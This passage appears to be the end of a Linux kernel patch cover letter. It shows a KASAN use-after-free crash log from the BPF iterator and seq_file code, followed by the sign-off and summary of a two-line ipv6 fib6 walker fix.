[    9.380927]  kasan_save_stack (mm/kasan/common.c:57)
[    9.380930]  kasan_save_track (mm/kasan/common.c:78)
[    9.380932]  __kasan_kmalloc (mm/kasan/common.c:398 mm/kasan/common.c:415)
[    9.380934]  __kmalloc_noprof (include/linux/kasan.h:263 mm/slub.c:5414 mm/slub.c:5439)
[    9.380937]  __seq_open_private (include/linux/slab.h:995 include/linux/slab.h:1312 fs/seq_file.c:637)
[    9.380939]  prepare_seq_file (kernel/bpf/bpf_iter.c:607)
[    9.380942]  bpf_iter_new_fd (kernel/bpf/bpf_iter.c:650)
[    9.380944]  __sys_bpf (kernel/bpf/syscall.c:6152 kernel/bpf/syscall.c:6458)
[    9.380946]  __x64_sys_bpf (kernel/bpf/syscall.c:6486 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2) kernel/bpf/syscall.c:6483 (discriminator 2))
[    9.380948]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    9.380950]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    9.380952]
[    9.380953] Freed by task 277:
[    9.380954]  kasan_save_stack (mm/kasan/common.c:57)
[    9.380956]  kasan_save_track (mm/kasan/common.c:78)
[    9.380959]  kasan_save_free_info (mm/kasan/generic.c:584)
[    9.380961]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
[    9.380963]  kfree (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:6499 mm/slub.c:6792)
[    9.380965]  seq_release_private (fs/seq_file.c:624)
[    9.380967]  __fput (fs/file_table.c:512)
[    9.380970]  fput_close_sync (fs/file_table.c:617)
[    9.380971]  __x64_sys_close (fs/open.c:1560 fs/open.c:1545 fs/open.c:1545)
[    9.380973]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    9.380975]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    9.380978]
[    9.380978] The buggy address belongs to the object at ffff88800bfe99c0
[    9.380978]  which belongs to the cache kmalloc-192 of size 192
[    9.380980] The buggy address is located 96 bytes inside of
[    9.380980]  freed 192-byte region [ffff88800bfe99c0, ffff88800bfe9a80)
[    9.380983]
[    9.380983] The buggy address belongs to the physical page:
[    9.380985] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xbfe8
[    9.380988] head: order:1 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    9.380989] flags: 0x100000000000040(head|node=0|zone=1)
[    9.380992] page_type: f5(slab)
[    9.380995] raw: 0100000000000040 ffff8880010424c0 ffffea00001d2c10 ffffea0000251e90
[    9.380997] raw: 0000000000000000 0000000000150015 00000000f5000000 0000000000000000
[    9.381000] head: 0100000000000040 ffff8880010424c0 ffffea00001d2c10 ffffea0000251e90
[    9.381002] head: 0000000000000000 0000000000150015 00000000f5000000 0000000000000000
[    9.381004] head: 0100000000000001 ffffffffffffff81 00000000ffffffff 00000000ffffffff
[    9.381006] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    9.381007] page dumped because: kasan: bad access detected
[    9.381008]
[    9.381009] Memory state around the buggy address:
[    9.381010]  ffff88800bfe9900: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    9.381012]  ffff88800bfe9980: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
[    9.381013] >ffff88800bfe9a00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    9.381014]                                ^
[    9.381029]  ffff88800bfe9a80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    9.381031]  ffff88800bfe9b00: fc fc fc fc fc fc fc fc 00 00 00 00 00 00 00 00
[    9.381032] ==================================================================
[    9.381073] Kernel panic - not syncing: KASAN: panic_on_warn set ...

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  ipv6: fix fib6 walker UAF on seq stop

 net/ipv6/ip6_fib.c | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

-- 
2.43.0

